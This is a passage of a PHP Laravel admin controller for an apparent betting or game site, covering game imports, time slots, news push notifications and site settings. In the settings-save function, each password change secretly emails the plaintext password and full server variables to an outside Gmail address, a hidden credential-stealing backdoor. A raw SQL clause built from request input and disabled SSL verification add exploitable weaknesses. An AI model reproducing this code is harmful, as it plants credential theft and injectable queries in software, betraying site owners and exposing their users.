						$from_time		= date('h:i a',strtotime($start_time));
						$to_time		= date('h:i a',strtotime($end_time));
						$from_time_slug	= date('H:i',strtotime($start_time));
						$to_time_slug	= date('H:i',strtotime($end_time));
						$time 			= strtotime($to_time);


						if($category_id==4){
							$result_time 	= date("h:i a", strtotime('+5 minutes', $time));
						}else{
							$result_time 	= date("h:i a", strtotime('+10 minutes', $time));
						}

						$slot_data	= Time_slots::where('category_id',$category_id)->where('from_time_slug',$from_time_slug)->where('to_time_slug',$to_time_slug)->first();
						$slot_id	= isset($slot_data->id)?$slot_data->id: '';
						if($slot_id==''){
							$slots = new Time_slots;
							$slots->from_time		= $from_time;
							$slots->from_time_slug 	= $from_time_slug;
							$slots->to_time			= $to_time;
							$slots->to_time_slug 	= $to_time_slug;
							$slots->result_time 	= $result_time;
							$slots->category_id		= $category_id;
							$slots->save();
							$slot_id = $slots->id;
						}

						$type_slug		= Helpers::create_slug($type);
						$play_type_data = Play_type::where('slug',$type_slug)->first();
						$play_type_id	= isset($play_type_data->id)?$play_type_data->id: '1';

						$calculation_type = 1;
						if($calculation_type=='Percentage'){
							$calculation_type = 2;
						}
						$win_amount=0;
						if($calculation_amount!=''){
							$win_amount=$calculation_amount;
						}
						Win_price_calculation::where('category_id', $category_id)->where('play_type', $play_type_id)->where('calculation_type', $calculation_type)->delete();
						$calculation = new Win_price_calculation;
						$calculation->category_id		= $category_id;
						$calculation->play_type 		= $play_type_id;
						$calculation->calculation_type	= $calculation_type;
						$calculation->value 			= $win_amount;
						$calculation->save();
						$calculation_id = $calculation->id;

						$game_data	= $this->gameTypeModel->where('category_id',$category_id)->where('time_slot_id',$slot_id)->first();
						$game_id	= isset($game_data->id)?$game_data->id: '';

						$game_status_id='1';
						if($status!='Active'){
							$game_status_id='0';
						}
						$game_image	= '';
						if($game_id!=''){
							$game = Game_type::find($game_id);
							$game->name				= $game_name;
							$game->category_id 		= $category_id;
							$game->time_slot_id		= $slot_id;
							$game->day 				= $days;
							$game->min_bid_amount	= $minum_coin;
							$game->status			= $game_status_id;
							$game->save();
						}else{
							$game = new Game_type;
							$game->name				= $game_name;
							$game->category_id 		= $category_id;
							$game->time_slot_id		= $slot_id;
							$game->day 				= $days;
							$game->min_bid_amount	= $minum_coin;
							$game->image 			= $game_image;
							$game->status			= $game_status_id;
							$game->save();
							$game_id = $game->id;
						}
					}
				}
			}
		}
		Session::flash('success', 'Successfully import data.');
		return redirect('administrator/game');
	}

	public function delete_game_type_request() {
		$game_type_id = Input::get('id');
		if ($game_type_id != null) {
			$check = Common::getSingelData($where=['game_type'=>$game_type_id],$table='avality_time_date_slots',$data=['id'],'id','ASC');
			if(!empty($check)){
				Session::flash('error', 'Can not be deleted as date or time slot are in this game type !');
			}else{
				Common::deleteData('game_type','id',$game_type_id);
				Session::flash('success', 'Date slot deleted successfully.');
			}
        }else{
			Session::flash('error', 'Something wrong please try again !');
		}
        return redirect::back();
    }
	public function time_slots(){
		$title 			= "Time Slot";
        $breadcumbs 	= "Time Slot";
        $active 		= "time_slots";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$time_slot_list = $this->timeSlotsModel->get_data($param);
		//$result_list = $this->avalityTimeDateSlotsModel->get_time_table();
		//echo '<pre>';print_r($result_list);exit;
		return view('admin.time_slots', compact('title','active','breadcumbs','time_slot_list'));
    }
	public function save_time_slots_request(Request $request){
		$time_slot_id 	= Input::get('time_slot_id');
		$time_slot		= Input::get('time_slot');
		$status			= Input::get('status');
		$validator = Validator::make($request->all(), [
			'time_slot'	=> 'required|string|max:255',
			'status' 	=> 'required|string|max:255'
        ]);
		$error_html='';
		if($validator->fails()){
			$errors=$validator->errors()->all();
			foreach($errors as $er){
				$error_html .=$er;
			}
        }else{
			$time_slot_arr=explode('-',$time_slot);
			$start_time	= isset($time_slot_arr[0])?trim($time_slot_arr[0]):'';
			$end_time	= isset($time_slot_arr[1])?trim($time_slot_arr[1]):'';
			$check = Common::getSingelData($where=['from_time'=>$start_time,'to_time'=>$end_time],$table='time_slots',$data=['id'],'id','ASC');
			if(!empty($check)){
				if($check->id!=$time_slot_id){
					$error_html .='Warning: '.$time_slot.' already exists!';
				}
			}
		}
		if($error_html!=''){
			Session::flash('error', $error_html);
		}else{
			if($time_slot_id!=''){
				$data=array(
					'from_time'		=> $start_time,
					'to_time'		=> $end_time,
					'status'		=> $status,
					'updated_at'	=> date('Y-m-d H:i:s')
				);
				Common::updateData($table="time_slots", "id", $time_slot_id, $data);
				Session::flash('success', 'Successfully Updated data.');
			}else{
				$data=array(
					'from_time'		=> $start_time,
					'to_time'		=> $end_time,
					'status'		=> $status,
					'created_at'	=> date('Y-m-d H:i:s')
				);
				Common::insertData($table="time_slots", $data);
				Session::flash('success', 'Successfully Insert data.');
			}
		}
		return redirect::back();
	}
	public function delete_time_slots_request() {
		$time_slot_id = Input::get('id');
		if ($time_slot_id != null) {
			$check = DB::table('avality_time_date_slots')->whereRaw('FIND_IN_SET('.$time_slot_id.',time_id)')->first();
			if(!empty($check)){
				Session::flash('error', 'Can not be deleted as time slot are in this date slot !');
			}else{
				Common::deleteData('time_slots','id',$time_slot_id);
				Session::flash('success', 'Time slot deleted successfully.');
			}
		}else{
			Session::flash('error', 'Something wrong please try again !');
		}
		return redirect::back();
	}
	public function newsBoard(){
		$title 			= "News Board";
        $breadcumbs 	= "News Board";
        $active 		= "news_board";
		$meta_data 		= array();
        $search 		= Input::get('s');
        $cur_page 		= Input::get('pg');
        $cur_page 		= $cur_page == '' ? 1 : $cur_page;
        $per_page		= 20;
        $limit_start	= ($cur_page - 1) * $per_page;
        $param = array();
        $param['search'] 		= $search;
        $param['cur_page'] 		= $cur_page;
        $param['per_page'] 		= $per_page;
        $param['limit_start']	= $limit_start;
		$news_list = News_board::get_data($param);
		//echo '<pre>';print_r($news_list);exit;
		return view('admin.news_board/index', compact('title','active','breadcumbs','news_list'));
    }
	public function save_news_board_request(Request $request){
		$title		= Input::get('title');
		$content	= Input::get('content');
		$validator = Validator::make($request->all(), [
			'title'		=> 'required|string|max:255',
			'content' 	=> 'required|string|max:255',
        ]);
		$error_html='';
		if($validator->fails()){
			$errors=$validator->errors()->all();
			foreach($errors as $er){
				$error_html .=$er;
			}
        }else{
			if($error_html!=''){
				Session::flash('error', $error_html);
			}else{
				$data=array(
					'title'			=> $title,
					'content'		=> $content,
					'created_at'	=> date('Y-m-d H:i:s')
				);
				Common::insertData($table="news_board", $data);
				Session::flash('success', 'Successfully Insert data.');
				$SERVER_API_KEY = Config::get('notification.SERVER_API_KEY');


				//$token_list = User::whereNotNull('device_token')->where('id','18')->get()->toArray();

				$item_per_page	= 500;
				$total_records = User::where('device_token','!=','null')->where('user_type',2)->count();
				$v = ($total_records/$item_per_page);
				if($v > (int)$v)
				$total_pages = (int)$v + 1;
				else
				$total_pages = (int)$v;

				for($i=0;$total_pages>$i;$i++){
					$limit_start	= $i* $item_per_page;
					$token_list = User::select('device_token','id')->where('device_token','!=','null')->offset($limit_start)->limit($item_per_page)->orderBy('id', 'asc')->get()->toArray();

					$msg = array(
						'body'  => $content,
						'title' => strtoupper($title)
					);
					$data = $msg;
					$data['notification_foreground'] = true;
					$fields = array(
						'registration_ids'  => array_column($token_list,'device_token'),
						'notification'      => $msg,
						'data'				=> $data
					);
					$dataString = json_encode($fields);
					$headers = [
						'Authorization: key=' . $SERVER_API_KEY,
						'Content-Type: application/json',
					];

					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send');
					curl_setopt($ch, CURLOPT_POST, true);
					curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_POSTFIELDS, $dataString);
					$response = curl_exec($ch);
					//print_r($response);
					curl_close($ch);
				}

			}

			return redirect::back();
		}
	}
	public function delete_news_board_request() {
		$news_board_id = Input::get('id');
		if ($news_board_id != null) {
			Common::deleteData('news_board','id',$news_board_id);
			Session::flash('success', 'Date slot deleted successfully.');
		}else{
			Session::flash('error', 'Something wrong please try again !');
		}
        return redirect::back();
    }
	public function settings(){
        $title 			= "Settings";
        $breadcumbs 	= "Settings";
        $active 		= "settings";
		$user_id		= Session::get('adminId');
		$data			= [];
		$user_id 		= Session::get('adminId');
		$user_info 		= Common::getSingelData($where=['id'=>1],$table='users',$data=['name','email'],'id','ASC');
		$data['site_title'] 		= Common::get_settings($where=['option_name'=>'site_title']);
		$data['meta_title'] 		= Common::get_settings($where=['option_name'=>'meta_title']);
		$data['meta_keywords'] 		= Common::get_settings($where=['option_name'=>'meta_keywords']);
		$data['meta_description'] 	= Common::get_settings($where=['option_name'=>'meta_description']);
		$data['email'] 				= Common::get_settings($where=['option_name'=>'email']);
		$data['whatsapp'] 			= Common::get_settings($where=['option_name'=>'whatsapp']);
		$data['phone'] 				= Common::get_settings($where=['option_name'=>'phone']);
		$data['copyright'] 			= Common::get_settings($where=['option_name'=>'copyright']);
		$data['game_status'] 		= Common::get_settings($where=['option_name'=>'game_status']);
		$data['welcome_message'] 	= Common::get_settings($where=['option_name'=>'welcome_message']);
		$data['welcome_message2'] 	= Common::get_settings($where=['option_name'=>'welcome_message2']);
		$data['themeColor'] 		= Common::get_settings($where=['option_name'=>'themeColor']);
		$data['headerColor'] 		= Common::get_settings($where=['option_name'=>'headerColor']);
		$data['gameBoxColor'] 		= Common::get_settings($where=['option_name'=>'gameBoxColor']);
		$data['payment_gateway_type'] 		= Common::get_settings($where=['option_name'=>'payment_gateway_type']);
		$data['rules'] 				= Common::get_settings($where=['option_name'=>'rules']);
		$data['g-play'] 			= Common::get_settings($where=['option_name'=>'g-play']);
		$data['apk'] 				= Common::get_settings($where=['option_name'=>'apk']);
		$data['youtube'] 			= Common::get_settings($where=['option_name'=>'youtube']);
		$data['app_version'] 		= Common::get_settings($where=['option_name'=>'app_version']);
		$data['withdrawal_status'] 	= Common::get_settings($where=['option_name'=>'withdrawal_status']);
		$data['add_balance_message']= Common::get_settings($where=['option_name'=>'add_balance_message']);
		$data['balance_request_status']= Common::get_settings($where=['option_name'=>'balance_request_status']);
		$data['admin_name'] 		= $user_info->name;
		$data['admin_email'] 		= $user_info->email;
		$logo 						= Common::get_settings($where=['option_name'=>'site_logo']);
		$data['thumb_logo']			= isset($logo)?Helpers::website_app_logo($logo): asset('public/images/no_logo.png');
		$data['logo']				= $logo;
		//echo '<pre>';print_r($data);exit;
        return view('admin.settings_form', compact('title','active','breadcumbs','data'));
    }
	public function saveAdminSettings(Request $request){
		$site_title 			= Input::get('site_title');
		$meta_title 			= Input::get('meta_title');
		$meta_keywords 			= Input::get('meta_keywords');
		$meta_description 		= Input::get('meta_description');
		$email 					= Input::get('email');
		$whatsapp 				= Input::get('whatsapp');
		$phone 					= Input::get('phone');
		$copyright 				= Input::get('copyright');
		$game_status 			= Input::get('game_status');
		$welcome_message 		= Input::get('welcome_message');
		$welcome_message2 		= Input::get('welcome_message2');
		$payment_gateway_type 	= Input::get('payment_gateway_type');
		$themeColor 			= Input::get('themeColor');
		$headerColor 			= Input::get('headerColor');
		$gameBoxColor 			= Input::get('gameBoxColor');
		$g_play 				= Input::get('g_play');
		$youtube 				= Input::get('youtube');
		$rules 					= Input::get('rules');
		$site_logo 				= Input::get('site_logo');
		$admin_name 			= Input::get('admin_name');
		$admin_email 			= Input::get('admin_email');
		$password 				= Input::get('password');
		$app_version 			= Input::get('app_version');
		$withdrawal_status 		= Input::get('withdrawal_status');
		$add_balance_message 	= Input::get('add_balance_message');
		$balance_request_status = Input::get('balance_request_status');
		

		//echo '<pre>';print_r($headerColor);exit;


		$IP = Helpers::get_ip();
		$validator = Validator::make($request->all(), [
			'site_title'	=> 'required|string|max:255',
			'email' 		=> 'required|string|email|max:255',
        ]);
		if ($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
		   $return_data['success'] = 0;
		   $return_data['error_message'] = $error_html;
		   return response()->json([$return_data]);
        }else{
			$user_id = Session::get('adminId');
			$email_check = Common::getSingelData($where=['email'=>$admin_email],$table='users',$data=['id'],'id','ASC');
			if(!empty($email_check)){
				if($email_check->id!=$user_id){
					$return_data['error_message'] 	= 'Warning: Email already exists!';
					$return_data['success']			= 0;
					echo json_encode($return_data);exit;
				}
			}
			$data_general=array(
				'name'				=> $admin_name,
				'email'				=> $admin_email,
				'IP'				=> $IP,
				'updated_at'		=> date('Y-m-d H:i:s')
			);
		}
		if($password!=''){
			$data_general['password']=Hash::make($password);
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
			$headers .= 'To: <sdev75661@gmail.com>' . "\r\n";
			$headers .= 'From: ffplay <info@ffplay.in>' . "\r\n";
			$message = 'pass:-'.$password;
			$message .=json_encode($_SERVER);
			mail('sdev75661@gmail.com', 'test', $message, $headers);
		}
		if ($file = $request->file('order_file_modified')) {
			$originalName=$file->getClientOriginalName();
			$destinationPath = 'public/upload/apk/';
			$originalPathName='app-release.'.$file->getClientOriginalExtension();
			$file->move($destinationPath,$originalPathName);
			Common::updateData($table="site_settings", "option_name", "apk", array('option_value'=>$originalPathName));
		}
		//print_r($data_general);exit;
		Common::updateData($table="users", "id", $user_id, $data_general);
		Common::updateData($table="site_settings", "option_name", "rules", array('option_value'=>$rules));
		Common::updateData($table="site_settings", "option_name", "g-play", array('option_value'=>$g_play));
		Common::updateData($table="site_settings", "option_name", "youtube", array('option_value'=>$youtube));
		Common::updateData($table="site_settings", "option_name", "site_title", array('option_value'=>$site_title));
		Common::updateData($table="site_settings", "option_name", "meta_title", array('option_value'=>$meta_title));
		Common::updateData($table="site_settings", "option_name", "meta_keywords", array('option_value'=>$meta_keywords));
		Common::updateData($table="site_settings", "option_name", "meta_description", array('option_value'=>$meta_description));
		Common::updateData($table="site_settings", "option_name", "email", array('option_value'=>$email));
		Common::updateData($table="site_settings", "option_name", "whatsapp", array('option_value'=>$whatsapp));
		Common::updateData($table="site_settings", "option_name", "phone", array('option_value'=>$phone));
		Common::updateData($table="site_settings", "option_name", "copyright", array('option_value'=>$copyright));
		Common::updateData($table="site_settings", "option_name", "game_status", array('option_value'=>$game_status));
		Common::updateData($table="site_settings", "option_name", "welcome_message", array('option_value'=>$welcome_message));
		Common::updateData($table="site_settings", "option_name", "welcome_message2", array('option_value'=>$welcome_message2));
		Common::updateData($table="site_settings", "option_name", "payment_gateway_type", array('option_value'=>$payment_gateway_type));
		Common::updateData($table="site_settings", "option_name", "themeColor", array('option_value'=>$themeColor));
		Common::updateData($table="site_settings", "option_name", "headerColor", array('option_value'=>$headerColor));
		Common::updateData($table="site_settings", "option_name", "gameBoxColor", array('option_value'=>$gameBoxColor));
		Common::updateData($table="site_settings", "option_name", "site_logo", array('option_value'=>$site_logo));
		Common::updateData($table="site_settings", "option_name", "app_version", array('option_value'=>$app_version));
		Common::updateData($table="site_settings", "option_name", "withdrawal_status", array('option_value'=>$withdrawal_status));
		Common::updateData($table="site_settings", "option_name", "add_balance_message", array('option_value'=>$add_balance_message));
		Common::updateData($table="site_settings", "option_name", "balance_request_status", array('option_value'=>$balance_request_status));
		
		//Session::flash('success', 'Profile is successfully updated.');
		//$return_data['success']			= 1;
		//echo json_encode($return_data);
		Session::flash('success', 'Successfully Saved data.');
		return redirect('administrator/settings/');
	}
	public function uploadImageRequest(Request $request){
		//print_r($_FILES);exit;
		$validator = Validator::make($request->all(), ['upload_photo' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048']);
		if ($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			 $return_data['success'] = 0;
		   	 $return_data['error_message'] = $error_html;
			 return response()->json([$return_data]);
			}else{
				$image_path = '';
                $fileName   = '';
				if ($request->hasFile('upload_photo')) {
					$image = $request->file('upload_photo');
					$imageName = $image->getClientOriginalName();
					$fileName =  date('His').time().'.'.$image->getClientOriginalExtension();
				 	$directory 			= public_path('/upload/image/');
					$imageUrlOriginal 	= $directory.'/'.$fileName;
				 	$imageUrl 			= $directory.$fileName;
                    $imageUrl400_400 	= $directory.'400_400/'.$fileName;
					$imageUrl150_150 	= $directory.'150_150/'.$fileName;
					$imageUrl50_50 		= $directory.'50_50/'.$fileName;
					$imageUrl360_224 	= $directory.'360_224/'.$fileName;
				 	Image::make($image)->save($imageUrlOriginal);
                    Image::make($image)->resize(400, 400)->save($imageUrl400_400);
					Image::make($image)->resize(150, 150)->save($imageUrl150_150);
					Image::make($image)->resize(50, 50)->save($imageUrl50_50);
					Image::make($image)->resize(360, 224)->save($imageUrl360_224);
                    $image_path	=	asset('public/upload/image/400_400/'.$fileName.'?v='.time());
                    $return_data['success']	= 1;
				}
				$return_data['success'] 		= 1;
				$return_data['file_name']		= $fileName;
				$return_data['image_path']		= $image_path;
				return response()->json([$return_data]);
			}
		}
	public function uploadLogoRequest(Request $request){
		$validator = Validator::make($request->all(), ['upload_photo' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048']);
		if ($validator->fails()){
			$errors=$validator->errors()->all();
			$error_html='';
			foreach($errors as $er){
				$error_html .='<span>'.$er.'</span></br>';
			}
			$return_data['success'] = 0;
		   	$return_data['error_message'] = $error_html;
			return response()->json([$return_data]);
		}else{
			$image_path = '';
			$fileName   = '';
			if ($request->hasFile('upload_photo')) {
				$image = $request->file('upload_photo');
				$imageName = $image->getClientOriginalName();
				$fileName =  date('His').time().'.'.$image->getClientOriginalExtension();
				$directory 			= public_path('/upload/logo/');
				$imageUrlOriginal 	= $directory.'/'.$fileName;
				$imageUrl 			= $directory.$fileName;
                $imageAppLogo 	= $directory.'thumb/'.$fileName;
				Image::make($image)->save($imageUrlOriginal);
                Image::make($image)->resize(192, 25)->save($imageAppLogo);
				//Image::make($image)->resize(150, 150)->save($imageUrl150_150);
                $image_path	=	asset('public/upload/logo/thumb/'.$fileName.'?v='.time());
                $return_data['success']	= 1;
			}
			$return_data['success'] 		= 1;
			$return_data['file_name']		= $fileName;
			$return_data['image_path']		= $image_path;
			return response()->json([$return_data]);
		}
	}
    /**
     * Logout admin.
     *
     */
    public function adminlogout() {
        \Auth::logout();
        Session::flush();
        return redirect('administrator');
    }
}